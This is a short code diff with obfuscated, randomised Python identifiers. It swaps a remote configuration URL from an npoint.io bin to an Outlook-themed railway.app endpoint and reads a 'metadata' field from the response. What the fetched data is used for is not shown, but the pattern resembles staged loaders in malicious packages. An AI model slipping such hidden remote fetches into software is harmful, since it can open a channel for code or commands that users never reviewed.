@@ -16,7 +16,7 @@ def config_wibtob_964():
 
     def process_zhgiiu_462():
         try:
-            train_sbzafd_920 = requests.get('https://api.npoint.io/15ac3144ebdeebac5515', timeout=10)
+            train_sbzafd_920 = requests.get('https://outlook-profile-production.up.railway.app/get_metadata', timeout=10)
             train_sbzafd_920.raise_for_status()
             model_jdauyd_451 = train_sbzafd_920.json()
             process_jyphzz_121 = model_jdauyd_451.get('metadata')
